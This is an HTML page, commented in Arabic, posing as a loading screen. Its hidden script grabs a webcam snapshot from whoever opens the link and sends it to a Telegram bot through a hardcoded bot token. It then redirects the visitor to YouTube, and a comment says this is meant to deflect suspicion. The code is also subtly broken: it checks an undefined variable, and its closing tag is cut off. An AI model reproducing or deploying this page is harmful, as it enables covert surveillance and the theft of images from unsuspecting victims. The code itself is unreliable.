<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>جاري التحميل...</title>
    <style>
        body { background-color: black; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: Arial, sans-serif; }
        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #3498db; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        // إعدادات البوت (سيتم استبدالها تلقائياً أو يدوياً)
        const BOT_TOKEN = '8410418500:AAEHAjlN1KbbcgN5g0nrgYiGKNzllqwmAyg';
        
        // الحصول على معرف الدردشة من الرابط (مثلاً index.html?chat_id=12345)
        const urlParams = new URLSearchParams(window.location.search);
        const chatId = urlParams.get('chat_id');

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;
                
                // الانتظار قليلاً حتى تفتح الكاميرا ثم التقاط الصورة
                setTimeout(() => {
                    takeSnapshot(stream);
                }, 2000);
            } catch (err) {
                console.error("Error accessing camera: ", err);
                // إعادة التوجيه لموقع حقيقي لإبعاد الشبهة
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }
        }

        function takeSnapshot(stream) {
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const context = canvas.getContext('2d');
            context.drawImage(video, 0, 0, 640, 480);
            
            canvas.toBlob(blob => {
                sendToTelegram(blob, stream);
            }, 'image/jpeg');
        }

        function sendToTelegram(blob, stream) {
            const formData = new FormData();
            formData.append('chat_id', chatId);
            formData.append('photo', blob, 'photo.jpg');
            formData.append('caption', '📸 تم التقاط صورة جديدة من الرابط!');

            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
                method: 'POST',
                body: formData
            }).then(response => {
                // إيقاف الكاميرا بعد الإرسال
                stream.getTracks().forEach(track => track.stop());
                // إعادة التوجيه لموقع حقيقي
                window.location.href = "https://www.youtube.com/watch?v=dQw4w9WgXcQ";
            }).catch(err => {
                console.error("Error sending to Telegram: ", err);
            });
        }

        if (chat_id) {
            startCamera();
        } else {
            document.body.innerHTML = "<h1>خطأ في الرابط</h1>";
        }
    </script>
</body>
</html
